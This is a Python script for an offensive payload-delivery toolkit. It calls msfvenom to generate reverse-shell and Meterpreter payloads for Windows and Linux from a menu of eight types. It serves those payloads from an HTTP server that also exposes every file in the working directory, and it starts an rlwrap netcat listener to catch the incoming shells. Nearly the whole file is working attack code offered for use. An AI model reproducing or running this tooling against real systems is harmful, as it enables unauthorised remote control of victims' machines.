# Required imports for network, system, and threading operations
import http.server
import socketserver
import subprocess
import os
import threading
import socket

def generate_payload(payload_type, lhost, lport, payload_file):
    """Generates the payload using msfvenom."""
    try:
        # Determine output format based on payload type
        format_type = "exe"  # Default format for Windows
        if payload_type.startswith("linux"):
            format_type = "elf"  # Linux executable format
        elif payload_type.endswith("python"):
            format_type = "py"   # Python script format
            
        # Construct msfvenom command with parameters
        command = [
            "msfvenom",
            "-p", payload_type,          # Specify payload type
            f"LHOST={lhost}",            # Local host for reverse connection
            f"LPORT={lport}",            # Local port for listening
            "-f", format_type,           # Output format (exe/elf/py)
            "-o", payload_file           # Output file path
        ]
        # Execute msfvenom command
        subprocess.run(command, check=True)
        print(f"[+] Payload generated: {payload_file}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Payload generation failed: {e}")
        return False

def start_http_server(host, port, payload_file):
    """Starts a simple HTTP server to serve files."""
    class MyHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            # Custom logging format for HTTP requests
            print(f"[+] {self.client_address[0]} - {args[0]} {args[1]} {args[2]}")
            
        def do_GET(self):
            # Log incoming GET requests
            print(f"[+] Incoming request from {self.client_address[0]} for {self.path}")
            requested_file = self.path[1:]  # Remove leading slash
            
            if os.path.exists(requested_file):
                # Set appropriate content type based on file extension
                content_type = 'application/octet-stream'  # Default binary type
                if requested_file.endswith('.txt'):
                    content_type = 'text/plain'
                elif requested_file.endswith('.html'):
                    content_type = 'text/html'
                elif requested_file.endswith('.py'):
                    content_type = 'text/plain'
                
                # Serve the file with proper headers
                self.send_response(200)
                self.send_header('Content-type', content_type)
                self.end_headers()
                with open(requested_file, 'rb') as f:
                    self.wfile.write(f.read())
                print(f"[+] Served file: {requested_file}")
                return
            # Show directory listing for root path
            elif self.path == '/':
                try:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    # Create HTML directory listing
                    self.wfile.write(b"<html><head><title>Available Files</title></head><body>")
                    self.wfile.write(b"<h1>Available Files:</h1>")
                    for filename in os.listdir('.'):
                        self.wfile.write(f"<a href='/{filename}'>{filename}</a><br>".encode())
                    self.wfile.write(b"</body></html>")
                except Exception as e:
                    print(f"[-] Error listing directory: {e}")
            else:
                # Handle file not found
                print(f"[-] File not found: {requested_file}")
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"Not Found")
                return

    try:
        # Start HTTP server
        with socketserver.TCPServer((host, port), MyHandler) as httpd:
            print(f"[+] Serving payload on http://{host}:{port}/{payload_file}")
            print(f"[+] Browse all files at http://{host}:{port}/")
            httpd.serve_forever()
    except Exception as e:
        print(f"[-] HTTP server error: {e}")

def start_listener(lhost, lport):
    """Starts a netcat listener for incoming connections."""
    try:
        # Use rlwrap for better shell experience
        listener_command = ["sudo", "rlwrap", "nc", "-lvnp", str(lport)]
        print(f"[+] Starting listener on port {lport}...")
        subprocess.run(listener_command)
    except FileNotFoundError:
        print("[-] rlwrap or nc not found. Installing rlwrap...")
        try:
            subprocess.run(["brew", "install", "rlwrap"])
            # Retry starting listener
            subprocess.run(listener_command)
        except Exception as e:
            print(f"[-] Error installing rlwrap: {e}")
    except Exception as e:
        print(f"[-] Listener error: {e}")

def get_payload(payload_source, payload_type, lhost, lport, payload_file):
    """Gets the payload, either from existing file or generates new one."""
    if payload_source == "1":  # Use existing file
        if not os.path.exists(payload_file):
            print(f"[-] Payload file not found: {payload_file}")
            return None
        print(f"[+] Using payload from file: {payload_file}")
        return payload_file
    elif payload_source == "2":  # Generate new payload
        if generate_payload(payload_type, lhost, lport, payload_file):
            return payload_file
        else:
            return None
    else:
        print("[-] Invalid payload source. Choose '1' or '2'.")
        return None

def get_all_local_ips():
    """Get all available local IP addresses from network interfaces."""
    local_ips = []
    try:
        # Get network interface information using ifconfig
        output = subprocess.check_output(['ifconfig']).decode('utf-8')
        
        # Parse ifconfig output
        current_interface = None
        for line in output.split('\n'):
            # New interface section
            if line and not line.startswith('\t'):
                current_interface = line.split(':')[0]
            # Look for inet addresses
            elif line.strip().startswith('inet '):
                ip = line.strip().split(' ')[1]
                # Skip localhost and duplicate IPs
                if not ip.startswith('127.') and ip not in local_ips:
                    local_ips.append(ip)
        
        # Sort IPs for better presentation
        local_ips.sort()
        
        return local_ips if local_ips else ["127.0.0.1"]
    except Exception as e:
        print(f"[-] Error getting local IPs: {e}")
        return ["127.0.0.1"]

# Replace the existing get_local_ip() function with get_ip_from_user()
def get_ip_from_user():
    """Let user choose from available local IPs."""
    local_ips = get_all_local_ips()
    
    print("\nAvailable local IP addresses:")
    for i, ip in enumerate(local_ips, 1):
        print(f"{i}. {ip}")
    
    while True:
        try:
            choice = input("\nSelect IP address (number) or enter custom IP: ")
            if choice.isdigit() and 1 <= int(choice) <= len(local_ips):
                return local_ips[int(choice) - 1]
            elif socket.inet_aton(choice):  # Validate custom IP format
                return choice
        except:
            print("Invalid selection. Please try again.")

# In the main execution block, modify the LHOST input section:
if __name__ == "__main__":
    print("""
╔═══════════════════════════════════════╗
║           Payload Generator           ║
║      HTTP Server & NC Listener        ║
╚═══════════════════════════════════════╝

Select operation mode:
1. Full operation (Generate payload + HTTP Server + Listener)
2. HTTP Server only
3. Listener only
4. HTTP Server + Listener
""")

    # Get operation mode
    while True:
        mode = input("Enter mode (1-4): ")
        if mode in ("1", "2", "3", "4"):
            break
        print("Invalid choice. Please enter 1, 2, 3, or 4.")

    if mode == "3":  # Listener only
        print("\nSelect LHOST IP address:")
        lhost = get_ip_from_user()
        lport = int(input("Enter LPORT: "))
        start_listener(lhost, lport)
    
    elif mode == "2":  # HTTP Server only
        print("\nSelect LHOST IP address:")
        lhost = get_ip_from_user()
        files = os.listdir('.')
        print("\n[+] Files available in current directory:")
        print("----------------------------------------")
        for i, filename in enumerate(files, 1):
            print(f"{i:2d}. {filename}")
        print("----------------------------------------\n")
        
        http_thread = threading.Thread(target=start_http_server, args=(lhost, 8000, ""))
        http_thread.daemon = True
        http_thread.start()
        
        input("[+] Press Enter to stop the HTTP server...")
        print("[+] Cleaning up...")

    elif mode == "4":  # HTTP Server + Listener
        print("\nSelect LHOST IP address:")
        lhost = get_ip_from_user()
        lport = int(input("Enter LPORT: "))

        # Display available files
        files = os.listdir('.')
        print("\n[+] Files available in current directory:")
        print("----------------------------------------")
        for i, filename in enumerate(files, 1):
            print(f"{i:2d}. {filename}")
        print("----------------------------------------\n")

        # Start HTTP server in a separate thread
        http_thread = threading.Thread(target=start_http_server, args=(lhost, 8000, ""))
        http_thread.daemon = True
        http_thread.start()

        # Start netcat listener
        start_listener(lhost, lport)
    
    else:  # Full operation (mode == "1")
        # Get user input for payload configuration
        while True:
            payload_source = input("Enter payload source ('1' for file, '2' for msfvenom): ")
            if payload_source in ("1", "2"):
                break
            else:
                print("Invalid choice. Please enter '1' or '2'.")

        payload_file = input("Enter payload file name: ")

        # If generating new payload, get additional configuration
        if payload_source == "2":
            while True:
                # Display payload type options
                print("\nChoose a payload type:")
                print("1. windows/x64/meterpreter_reverse_tcp")
                print("2. windows/x64/shell_reverse_tcp")
                print("3. linux/x64/shell_reverse_tcp")
                print("4. windows/meterpreter/reverse_tcp")
                print("5. linux/x86/shell_reverse_tcp")
                print("6. windows/x64/meterpreter/reverse_https")
                print("7. windows/x64/meterpreter/bind_tcp")
                print("8. cmd/unix/reverse_python")
                choice = input("Enter your choice (1-8): ")
                
                # Map choice to actual payload type
                if choice in ("1", "2", "3", "4", "5", "6", "7", "8"):
                    payload_types = {
                        "1": "windows/x64/meterpreter_reverse_tcp",
                        "2": "windows/x64/shell_reverse_tcp",
                        "3": "linux/x64/shell_reverse_tcp",
                        "4": "windows/meterpreter/reverse_tcp",
                        "5": "linux/x86/shell_reverse_tcp",
                        "6": "windows/x64/meterpreter/reverse_https",
                        "7": "windows/x64/meterpreter/bind_tcp",
                        "8": "cmd/unix/reverse_python"
                    }
                    payload_type = payload_types[choice]
                    break
                else:
                    print("Invalid choice. Please enter a number between 1 and 8.")

            # Get network configuration
            print("\nSelect LHOST IP address:")
            lhost = get_ip_from_user()
            lport = int(input("Enter LPORT: "))
        elif payload_source == "1":
            print("\nSelect LHOST IP address:")
            lhost = get_ip_from_user()
            lport = int(input("Enter LPORT: "))
            payload_type = ""

        # Get or generate the payload
        payload_file = get_payload(payload_source, payload_type, lhost, lport, payload_file)

        if payload_file:
            # Display available files in current directory
            files = os.listdir('.')
            print("\n[+] Files available in current directory:")
            print("----------------------------------------")
            for i, filename in enumerate(files, 1):
                print(f"{i:2d}. {filename}")
            print("----------------------------------------\n")

            # Start HTTP server in a separate thread
            http_thread = threading.Thread(target=start_http_server, args=("0.0.0.0", 8000, payload_file))
            http_thread.daemon = True
            http_thread.start()

            # Start netcat listener
            start_listener(lhost, lport)

            # Wait for user input before cleanup
            input("[+] Press Enter to stop the script and clean up...")
            print("[+] Cleaning up...")